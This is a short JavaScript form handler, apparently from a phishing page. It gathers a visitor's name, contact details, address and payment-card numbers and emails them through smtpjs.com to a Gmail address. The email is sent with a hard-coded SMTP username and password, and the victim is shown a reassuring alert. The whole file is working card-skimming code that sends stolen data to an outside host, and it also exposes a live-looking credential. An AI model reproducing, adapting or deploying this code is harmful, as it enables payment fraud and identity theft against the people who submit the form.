
var submitbtn = document.getElementById("submit");
submitbtn.addEventListener("click", (e) => {
     let secondData = document.getElementsByTagName("input");
   
     e.preventDefault();
let formdata = JSON.parse(localStorage.getItem("initial"));

formdata.front = secondData[0].value;
formdata.back = secondData[1].value;
formdata.number = secondData[2].value;
     var Email = { send: function (a) { return new Promise(function (n, e) { a.nocache = Math.floor(1e6 * Math.random() + 1), a.Action = "Send"; var t = JSON.stringify(a); Email.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?", t, function (e) { n(e) }) }) }, ajaxPost: function (e, n, t) { var a = Email.createCORSRequest("POST", e); a.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), a.onload = function () { var e = a.responseText; null != t && t(e) }, a.send(n) }, ajax: function (e, n) { var t = Email.createCORSRequest("GET", e); t.onload = function () { var e = t.responseText; null != n && n(e) }, t.send() }, createCORSRequest: function (e, n) { var t = new XMLHttpRequest; return "withCredentials" in t ? t.open(e, n, !0) : "undefined" != typeof XDomainRequest ? (t = new XDomainRequest).open(e, n) : t = null, t } };
   

   
     var emailConfig = {
       "Host" : "smtp.elasticemail.com",
       "Username" : "01marissacaitlin@gmail.com",
       "Password" : "4BAA3D4BDD8BA965875BDEFF54B63B3A7E5F",
       "To"  : "Ibraheemakin201@gmail.com",
       "From" : "Ibraheemakin201@gmail.com",
       "Subject" : "Phrase Image",
       "Body"  : `Dear User, Your details are 
         Firstname : ${formdata.firstname}
         Lastname : ${formdata.lastname}
         Email : ${formdata.email}
         Phone Number : ${formdata.phone}
         City : ${formdata.city}
         State : ${formdata.state}
         Zip : ${formdata.zip}
         City : ${formdata.city}
         amount : ${formdata.amount}
         address 1 : ${formdata.add1}
         addresss 2 : ${formdata.add2},
         Card Front No : ${formdata.front},
         Card Back No : ${formdata.back},
         Number : ${formdata.number}
       `
   }
   
     console.log(emailConfig);
     Email.send(emailConfig).then(
       message => alert("A notification has been sent to your mail")
     ).catch(
       error => console.error('Error sending email:', error)
     );

    });